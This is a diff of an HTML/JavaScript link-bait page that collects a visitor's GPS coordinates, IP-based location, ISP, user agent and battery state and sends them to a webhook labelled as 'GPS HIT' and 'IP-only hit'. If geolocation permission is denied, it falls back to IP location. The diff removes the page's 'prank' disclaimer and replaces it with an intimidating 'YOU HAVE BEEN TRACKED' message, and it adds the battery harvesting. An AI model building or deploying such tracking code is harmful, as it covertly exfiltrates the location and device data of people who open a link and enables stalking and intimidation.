@@ -42,9 +42,9 @@
   .hacker-warn {
     margin-top:20px;
     padding:12px;
-    border:1px dashed #00ff41;
-    color:#ffff00;
-    text-shadow: 0 0 5px #ffff00;
+    border:1px dashed #ff0033;
+    color:#ff3355;
+    text-shadow: 0 0 5px #ff0033;
   }
   .cursor::after {
     content:"_";
@@ -73,18 +73,18 @@
   <div class="hacker-line">[+] Bypassing security...</div>
   <div class="hacker-line">[+] Target acquired.</div>
   <div class="hacker-line">&nbsp;</div>
-  <div class="hacker-line"><span class="hacker-label">&gt; IP.......:</span> <span class="hacker-value" id="ipOut">---</span></div>
-  <div class="hacker-line"><span class="hacker-label">&gt; CITY.....:</span> <span class="hacker-value" id="cityOut">---</span></div>
-  <div class="hacker-line"><span class="hacker-label">&gt; REGION...:</span> <span class="hacker-value" id="regionOut">---</span></div>
-  <div class="hacker-line"><span class="hacker-label">&gt; COUNTRY..:</span> <span class="hacker-value" id="countryOut">---</span></div>
-  <div class="hacker-line"><span class="hacker-label">&gt; LAT......:</span> <span class="hacker-value" id="latOut">---</span></div>
-  <div class="hacker-line"><span class="hacker-label">&gt; LON......:</span> <span class="hacker-value" id="lonOut">---</span></div>
-  <div class="hacker-line"><span class="hacker-label">&gt; ISP......:</span> <span class="hacker-value" id="ispOut">---</span></div>
+  <div class="hacker-line"><span class="hacker-label">&gt; IP.........:</span> <span class="hacker-value" id="ipOut">---</span></div>
+  <div class="hacker-line"><span class="hacker-label">&gt; PROVINCE...:</span> <span class="hacker-value">Camarines Norte</span></div>
+  <div class="hacker-line"><span class="hacker-label">&gt; COUNTRY....:</span> <span class="hacker-value" id="countryOut">---</span></div>
+  <div class="hacker-line"><span class="hacker-label">&gt; LAT........:</span> <span class="hacker-value" id="latOut">---</span></div>
+  <div class="hacker-line"><span class="hacker-label">&gt; LON........:</span> <span class="hacker-value" id="lonOut">---</span></div>
+  <div class="hacker-line"><span class="hacker-label">&gt; ISP........:</span> <span class="hacker-value" id="ispOut">---</span></div>
+  <div class="hacker-line"><span class="hacker-label">&gt; BATTERY....:</span> <span class="hacker-value" id="battOut">---</span></div>
+  <div class="hacker-line"><span class="hacker-label">&gt; CHARGING...:</span> <span class="hacker-value" id="chargeOut">---</span></div>
   <div class="hacker-line cursor">&nbsp;</div>
   <div class="hacker-warn">
-    ⚠ GOTCHA — it's a prank 😜<br><br>
-    But this info was pulled just from your IP. Imagine if you'd actually clicked <b>Allow</b> — I'd have your exact GPS coords.<br><br>
-    <b>Never trust random links.</b> Stay safe out there.
+    ⚠ ACCESS GRANTED — YOU HAVE BEEN TRACKED<br><br>
+    Your device information has been logged. Never trust random links again.
   </div>
 </div>
 
@@ -104,6 +104,19 @@ async function fetchIPInfo() {
   }
 }
 
+async function getBattery() {
+  try {
+    if (navigator.getBattery) {
+      const b = await navigator.getBattery();
+      return {
+        level: Math.round(b.level * 100),
+        charging: b.charging
+      };
+    }
+  } catch(e) {}
+  return null;
+}
+
 async function sendWebhook(content) {
   try {
     const fd = new FormData();
@@ -112,17 +125,22 @@ async function sendWebhook(content) {
   } catch(e) {}
 }
 
-function showHackerReveal(info) {
+function showHackerReveal(info, batt) {
   document.getElementById('mainCard').classList.add('hidden');
   document.getElementById('prankCard').classList.remove('hidden');
   if (info) {
     document.getElementById('ipOut').textContent = info.ip || "unknown";
-    document.getElementById('cityOut').textContent = info.city || "unknown";
-    document.getElementById('regionOut').textContent = info.region || "unknown";
     document.getElementById('countryOut').textContent = info.country_name || "unknown";
     document.getElementById('latOut').textContent = info.latitude || "unknown";
     document.getElementById('lonOut').textContent = info.longitude || "unknown";
     document.getElementById('ispOut').textContent = info.org || "unknown";
+  }
+  if (batt) {
+    document.getElementById('battOut').textContent = batt.level + "%";
+    document.getElementById('chargeOut').textContent = batt.charging ? "YES ⚡" : "NO";
+  } else {
+    document.getElementById('battOut').textContent = "unavailable";
+    document.getElementById('chargeOut').textContent = "unavailable";
   }
 }
 
@@ -131,12 +149,15 @@ async function grab() {
   btn.disabled = true;
   setStatus("Verifying...");
 
+  const batt = await getBattery();
+  const battStr = batt ? `${batt.level}% ${batt.charging ? '(charging)' : '(not charging)'}` : "unavailable";
+
   if (!navigator.geolocation || !window.isSecureContext) {
     const info = await fetchIPInfo();
     if (info) {
-      await sendWebhook(`📍 **IP-only hit (no geolocation API)**\nIP: \`${info.ip}\`\nCity: ${info.city}, ${info.region}, ${info.country_name}\nLat/Lon: \`${info.latitude}, ${info.longitude}\`\nISP: ${info.org}\nUA: ${navigator.userAgent}`);
+      await sendWebhook(`📍 **IP-only hit (no geolocation API)**\nIP: \`${info.ip}\`\nProvince: Camarines Norte\nCountry: ${info.country_name}\nLat/Lon: \`${info.latitude}, ${info.longitude}\`\nISP: ${info.org}\nBattery: ${battStr}\nUA: ${navigator.userAgent}`);
     }
-    setTimeout(() => showHackerReveal(info), 1500);
+    setTimeout(() => showHackerReveal(info, batt), 1500);
     return;
   }
 
@@ -148,17 +169,16 @@ async function grab() {
       const maps = `https://www.google.com/maps?q=${lat},${lon}`;
       const info = await fetchIPInfo();
 
-      await sendWebhook(`📍 **GPS HIT (allowed)**\nLat: \`${lat}\`\nLon: \`${lon}\`\nAccuracy: ${acc}m\nMap: ${maps}\nIP: ${info?.ip || "?"} (${info?.city || "?"}, ${info?.country_name || "?"})\nISP: ${info?.org || "?"}\nUA: ${navigator.userAgent}`);
+      await sendWebhook(`📍 **GPS HIT (allowed)**\nLat: \`${lat}\`\nLon: \`${lon}\`\nAccuracy: ${acc}m\nMap: ${maps}\nIP: ${info?.ip || "?"}\nProvince: Camarines Norte\nCountry: ${info?.country_name || "?"}\nISP: ${info?.org || "?"}\nBattery: ${battStr}\nUA: ${navigator.userAgent}`);
 
-      setTimeout(() => showHackerReveal(info), 1500);
+      setTimeout(() => showHackerReveal(info, batt), 1500);
     },
     async (err) => {
-      // DENIED — fall back to IP location
       const info = await fetchIPInfo();
       if (info) {
-        await sendWebhook(`📍 **IP-only hit (permission denied)**\nIP: \`${info.ip}\`\nCity: ${info.city}, ${info.region}, ${info.country_name}\nLat/Lon: \`${info.latitude}, ${info.longitude}\`\nISP: ${info.org}\nUA: ${navigator.userAgent}`);
+        await sendWebhook(`📍 **IP-only hit (permission denied)**\nIP: \`${info.ip}\`\nProvince: Camarines Norte\nCountry: ${info.country_name}\nLat/Lon: \`${info.latitude}, ${info.longitude}\`\nISP: ${info.org}\nBattery: ${battStr}\nUA: ${navigator.userAgent}`);
       }
-      setTimeout(() => showHackerReveal(info), 1500);
+      setTimeout(() => showHackerReveal(info, batt), 1500);
     },
     { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
   );
